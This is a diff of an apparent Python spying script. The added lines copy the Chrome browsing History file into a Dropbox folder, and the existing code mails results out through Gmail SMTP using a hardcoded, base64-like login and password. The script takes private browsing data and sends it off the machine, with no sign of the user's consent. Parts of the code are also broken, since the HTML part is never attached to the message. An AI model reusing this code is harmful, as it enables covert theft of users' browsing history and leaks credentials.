@@ -65,9 +65,13 @@ def main(platform):
         #print (output)
         #print (f'{p_status} {p_status}')
 #--------------------------------------------------------------------------------------------
+        p = subprocess.Popen('copy "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History" "C:\\Users\\User\\Dropbox\\TUFMV0FS\\TestingArea"', stdout=subprocess.PIPE, shell=True)
 
+        (copydata, err) = p.communicate()
 
-
+        p_status = p.wait()
+        print(copydata)
+#-----------------------------------------------------------------------------------------------------
 
         msg = EmailMessage()
         msg.set_content(message)
@@ -75,17 +79,32 @@ def main(platform):
         msg['Subject'] = info
         msg['From'] = "SVBBZGRy@gmail.com"
         msg['To'] = "SVBBZGRy@gmail.com"
+        html = """\
+        <html>
+        <body>
+            <p>Hi,<br>
+            How are you?<br>
+            <a href="http://www.realpython.com">Real Python</a> 
+            has many great tutorials.
+            </p>
+        </body>
+        </html>
+        """
 
-        dir_path = os.path.join("C:", os.sep, 'Users','User','AppData','Local','Google','Chrome','User Data','Default','History')
-        files = os.path.join("C:", os.sep, 'User','Dropbox','TUFMV0FS','TestingArea')
-        copyfile(dir_path, files)
+        # Turn these into plain/html MIMEText objects
+        part = MIMEText(html, "html")
+
+        # Add HTML/plain-text parts to MIMEMultipart message
+        # The email client will try to render the last part first
+
         # Send the message via our own SMTP server.
         server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
         server.login("SVBBZGRy@gmail.com", "SVBBZGRy")
-        server.send_message(msg)
+        server.send_message(msg,part)
         server.quit()
 
         #C: \Users\User\AppData\Local\Google\Chrome\User Data\Default
+        #cd %APPDATA%\Local\Google\Chrome\User Data\Default
 #win part end
 
     def mac():
